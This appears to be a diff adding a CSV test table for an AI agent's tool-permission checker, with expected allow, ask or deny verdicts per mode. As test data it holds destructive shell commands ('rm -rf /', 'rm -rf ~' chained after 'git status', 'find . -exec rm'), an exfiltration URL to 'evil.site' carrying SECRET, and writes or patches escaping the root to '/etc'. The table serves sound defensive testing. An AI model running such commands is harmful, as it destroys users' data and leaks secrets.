@@ -1,0 +1,34 @@
+id,mode,tool,args,meta,allowed_commands,session_tools,session_commands,standing,auto_allow,allowed_domains,expected,note
+read-interactive,interactive,read_file,"{""path"": ""a.txt""}",,,,,,,,allow,pure local read always runs
+read-plan,plan,read_file,"{""path"": ""a.txt""}",,,,,,,,allow,reads allowed in read-only modes
+write-interactive,interactive,write_file,"{""path"": ""a.txt"", ""content"": ""x""}",,,,,,,,ask,write in-root asks
+write-escape-rel,interactive,write_file,"{""path"": ""../../escape.txt"", ""content"": ""x""}",,,,,,,,deny,write outside writable root blocked
+write-escape-abs,interactive,write_file,"{""path"": ""/etc/evil.ini"", ""content"": ""x""}",,,,,,,,deny,absolute path outside root blocked
+write-plan,plan,write_file,"{""path"": ""a.txt"", ""content"": ""x""}",,,,,,,,deny,plan mode is read-only
+write-auto,auto,write_file,"{""path"": ""a.txt"", ""content"": ""x""}",,,,,,,,allow,auto allows in-root write
+write-auto-escape,auto,write_file,"{""path"": ""../../escape.txt"", ""content"": ""x""}",,,,,,,,deny,auto still path-scopes writes
+write-custom-autoallow,custom,write_file,"{""path"": ""a.txt"", ""content"": ""x""}",,,,,,write_file,,allow,custom mode auto-approves configured tool
+write-custom-notlisted,custom,write_file,"{""path"": ""a.txt"", ""content"": ""x""}",,,,,,,,ask,custom mode still asks for unlisted tool
+shell-interactive,interactive,run_shell,"{""command"": ""pytest -q""}",,,,,,,,ask,shell asks by default
+shell-allowlist-prefix,interactive,run_shell,"{""command"": ""git status -s""}",,git status,,,,,,allow,command matches allowlist prefix
+shell-allowlist-chained,interactive,run_shell,"{""command"": ""git status && rm -rf ~""}",,git status,,,,,,ask,operator disqualifies the chained command
+shell-session-command,interactive,run_shell,"{""command"": ""make build""}",,,,make build,,,,allow,exact session command grant
+shell-plan,plan,run_shell,"{""command"": ""ls""}",,,,,,,,deny,plan mode blocks shell
+shell-auto,auto,run_shell,"{""command"": ""rm -rf /""}",,,,,,,,allow,BASELINE-WRONG auto allows any command with no sandbox
+shell-find-delete,interactive,run_shell,"{""command"": ""find . -delete""}",,find,,,,,,ask,FIXED-PR3 -delete is never prefix-eligible
+shell-find-exec,interactive,run_shell,"{""command"": ""find . -exec rm {} +""}",,find,,,,,,ask,FIXED-PR3 -exec is never prefix-eligible
+shell-two-reads,interactive,run_shell,"{""command"": ""git status && git diff""}",,git status|git diff,,,,,,allow,FIXED-PR3 each part independently allowed
+shell-chain-unallowed,interactive,run_shell,"{""command"": ""git status && rm -rf ~""}",,git status,,,,,,ask,chaining still cannot smuggle an unallowed part
+shell-inline-interpreter,interactive,run_shell,"{""command"": ""python -c 'import os'""}",,python,,,,,,ask,FIXED-PR3 inline code is never prefix-eligible
+connector-read,interactive,gmail_list,{},read,,,,,,,allow,connector read never gates
+connector-write,interactive,gmail_send,{},external,,,,,,,ask,connector write asks
+connector-always-ignored,interactive,gmail_send,{},external,,gmail_send,,,,,ask,session tool grant deliberately ignored for connectors
+standing-match,interactive,send_message,"{""target"": ""slack:T1/C1"", ""text"": ""hi""}",external,,,,send_message slack:T1/C1,,,allow,standing rule matches the exact target
+standing-mismatch,interactive,send_message,"{""target"": ""slack:T1/C2"", ""text"": ""hi""}",external,,,,send_message slack:T1/C1,,,ask,standing rule does not cover a different target
+webfetch-interactive,interactive,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,ask,FIXED-PR1 web_fetch is egress so now asks in interactive
+webfetch-plan,plan,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,deny,FIXED-PR1 egress is not a read so plan mode blocks it
+webfetch-auto,auto,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,allow,auto allows egress
+webfetch-allowed-domain,interactive,web_fetch,"{""url"": ""https://docs.python.org/3/x""}",,,,,,,python.org,allow,egress to a config-allowed domain (subdomain match)
+webfetch-session-domain,interactive,web_fetch,"{""url"": ""https://api.github.com/x""}",,,,,,,,ask,egress to an unlisted domain still asks
+patch-escape,auto,apply_patch,"{""patch"": ""*** Begin Patch\n*** Update File: ../../etc/hosts\n@@\n-a\n+b\n*** End Patch""}",,,,,,,,deny,FIXED-PR1 apply_patch path extracted from blob and scoped even in auto
+patch-inroot,auto,apply_patch,"{""patch"": ""*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch""}",,,,,,,,allow,apply_patch to an in-root path allowed in auto
